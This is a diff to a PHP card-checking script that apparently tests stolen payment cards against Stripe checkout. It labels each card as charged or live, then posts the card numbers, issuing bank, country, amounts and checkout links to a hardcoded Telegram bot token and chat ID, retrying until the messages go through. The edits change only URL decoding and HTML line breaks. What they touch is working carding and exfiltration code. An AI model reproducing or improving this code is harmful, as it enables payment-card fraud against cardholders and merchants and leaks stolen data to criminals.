@@ -382,11 +382,11 @@ $botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
 $chatID = urlencode('-1001815647781');
 
 #############SEND TO TG BOT WHEN CHARGED
-$charged_message = "Successfull Checkout\r\n\nBIN:\r\n$lista\r\nSuccess URL:\r\n".urlencode($success)."\r\nAmount: ".strtoupper($currency)." $xamount\r\n\nChecked from:\r\n$domain";
+$charged_message = "Successfull Checkout\r\n\nBIN:\r\n$lista\r\nSuccess URL:\r\n".urldecode($success)."\r\nAmount: ".strtoupper($currency)." $xamount\r\n\nChecked from:\r\n$domain";
 $sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($charged_message).'';
 
 #############SEND TO TG BOT WHEN INSUFFBAL
-$insuf_message = "Insufficient Funds\r\n\nBIN: $lista\r\nAmount to bill: ".strtoupper($currency)." $xamount\r\nStripe Checkout link:\r\n$colink\r\n\nChecked from:\r\n$domain";
+$insuf_message = "Insufficient Funds\r\n\nBIN: $lista\r\nAmount to bill: ".strtoupper($currency)." $xamount\r\nStripe Checkout link:\r\n".urldecode($colink)."\r\n\nChecked from:\r\n$domain";
 $sendinsuff = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($insuf_message).'';
     
 #############BOT RETRY TO SEND IF ITS NOT WORKS
@@ -401,7 +401,7 @@ $sendinsufftotg = false;
     while (!$sendchargedtotg && $num_retries < $max_retries) {
     $sendchargedtotg = @file_get_contents($sendcharged);
     $num_retries++;
-    echo "<span class='badge badge-success'>#CHARGED</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: green;' class='badge'>The payment transaction has been successfully processed <a href='$success'  target='_blank'>[ proof here ]</a> -Alice Schuberg 💰✅</span>";
+    echo "<span class='badge badge-success'>#CHARGED</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: green;' class='badge'>The payment transaction has been successfully processed <a href='$success'  target='_blank'>[ proof here ]</a> -Alice Schuberg 💰✅</span><br>";
 }
     exit();
 }
@@ -427,7 +427,7 @@ if (strpos($curl0, '"insufficient_funds"')) {
     while (!$sendinsufftotg && $num_retries < $max_retries) {
     $sendinsufftotg = @file_get_contents($sendinsuff);
     $num_retries++;
-    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span>";
+    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
 }
     exit();
 }
@@ -465,7 +465,7 @@ if (strpos($curl1, '"insufficient_funds"')) {
     while (!$sendinsufftotg && $num_retries < $max_retries) {
     $sendinsufftotg = @file_get_contents($sendinsuff);
     $num_retries++;
-    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span>";
+    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
 }
     exit();
 }
@@ -499,7 +499,7 @@ if (strpos($result1, '"insufficient_funds"')) {
     while (!$sendinsufftotg && $num_retries < $max_retries) {
     $sendinsufftotg = @file_get_contents($sendinsuff);
     $num_retries++;
-    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span>";
+    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
 }
     exit();
 }
